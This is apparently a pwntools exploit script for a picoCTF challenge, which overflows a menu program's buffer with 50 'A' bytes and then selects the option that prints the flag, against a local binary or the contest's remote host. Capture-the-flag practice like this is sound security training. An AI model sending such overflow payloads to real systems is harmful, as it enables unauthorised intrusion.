#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net" , 59606)

    return r


def main():
    r = conn()
    payload =b"A"*50
    r.recvuntil(b"choice:")
    r.sendline(b'2')
    r.recvuntil(b"buffer:")
    r.sendline(payload)
    r.recvuntil(b"choice:")
    r.sendline(b'4')
    print(r.recvall())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
